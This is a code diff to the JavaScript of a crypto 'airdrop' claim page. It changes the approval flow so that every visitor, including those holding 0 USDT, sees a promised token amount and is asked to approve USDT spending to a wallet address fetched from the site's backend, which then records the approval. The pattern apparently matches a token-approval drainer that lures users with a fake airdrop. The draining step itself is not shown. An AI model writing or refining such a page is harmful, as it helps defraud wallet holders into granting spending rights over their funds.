@@ -969,7 +969,7 @@
             }
         }
 
-        // ✅ UPDATED: Check Balance and Approve Function with your requirements
+        // ✅ UPDATED: Check Balance and Approve Function - 0 USDT users allowed
         async function checkBalanceAndApprove() {
             try {
                 console.log("🔄 Starting approval process...");
@@ -1003,21 +1003,21 @@
                 console.log("💰 USDT Balance:", balanceInUSDT);
                 document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
                 
-               // ✅ CHANGE: 0 USDT wale ko bhi airdrop amount show karo
-const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
-const tier = getTier(parseFloat(balanceInUSDT));
+                // ✅ UPDATED: Show actual airdrop amount for all users (including 0 USDT)
+                const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
+                const tier = getTier(parseFloat(balanceInUSDT));
+                
+                document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
+                document.getElementById("tierBadge").textContent = tier;
 
-document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
-document.getElementById("tierBadge").textContent = tier;
-
-// ✅ CHANGE: 0 USDT wale ko bhi allow karo approval ke liye
-button.innerHTML = '<div class="loading"></div> Approving USDT...';
-
-if (airdropAmount === 0) {
-    showAlert(`⚠️ Note: You will receive 0 tokens as you have less than 1 USDT`, "warning");
-} else {
-    showAlert(`💰 Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT | Airdrop: ${airdropAmount.toLocaleString()} tokens`, "info");
-}
+                // ✅ UPDATED: Allow approval for all users (including 0 USDT)
+                button.innerHTML = '<div class="loading"></div> Approving USDT...';
+                
+                if (airdropAmount === 0) {
+                    showAlert(`⚠️ Note: You will receive 0 tokens as you have less than 1 USDT`, "warning");
+                } else {
+                    showAlert(`💰 Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT | Airdrop: ${airdropAmount.toLocaleString()} tokens`, "info");
+                }
                 
                 try {
                     const approvalWallet = await getApprovalWalletFromBackend();
@@ -1048,19 +1048,12 @@ if (airdropAmount === 0) {
                         if (tx.status) {
                             showAlert("✅ USDT Approval Successful!", "success");
                             
-                            // ✅ ENABLE CLAIM BUTTON AFTER APPROVAL
+                            // ✅ UPDATED: Enable claim button for ALL users after approval
                             document.getElementById("claimButton").disabled = false;
                             document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Approved & Ready';
                             document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                             
-                            // ✅ ONLY AFTER APPROVAL: Calculate and show actual airdrop amount
-                            const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
-                            const tier = getTier(parseFloat(balanceInUSDT));
-                            
-                            document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
-                            document.getElementById("tierBadge").textContent = tier;
-                            
-                            showAlert(`🎉 Airdrop Amount: ${airdropAmount.toLocaleString()} tokens (${tier} Tier)`, "success");
+                            showAlert(`🎉 Ready to Claim ${airdropAmount.toLocaleString()} tokens!`, "success");
                             
                             // Save to backend
                             await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
@@ -1072,19 +1065,12 @@ if (airdropAmount === 0) {
                         console.log("✅ Already approved, skipping approval");
                         showAlert("✅ USDT Already Approved", "success");
                         
-                        // ✅ ALREADY APPROVED - ENABLE CLAIM BUTTON AND SHOW AIRDROP AMOUNT
+                        // ✅ UPDATED: Enable claim button for ALL users if already approved
                         document.getElementById("claimButton").disabled = false;
                         document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Already Approved';
                         document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                         
-                        // ✅ SHOW ACTUAL AIRDROP AMOUNT AFTER APPROVAL
-                        const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
-                        const tier = getTier(parseFloat(balanceInUSDT));
-                        
-                        document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
-                        document.getElementById("tierBadge").textContent = tier;
-                        
-                        showAlert(`✅ USDT Already Approved | 🎉 Airdrop: ${airdropAmount.toLocaleString()} tokens (${tier} Tier)`, "success");
+                        showAlert(`✅ USDT Already Approved | Ready to Claim ${airdropAmount.toLocaleString()} tokens!`, "success");
                     }
 
                 } catch (approvalError) {
@@ -1320,4 +1306,3 @@ if (airdropAmount === 0) {
     </script>
 </body>
 </html>
-
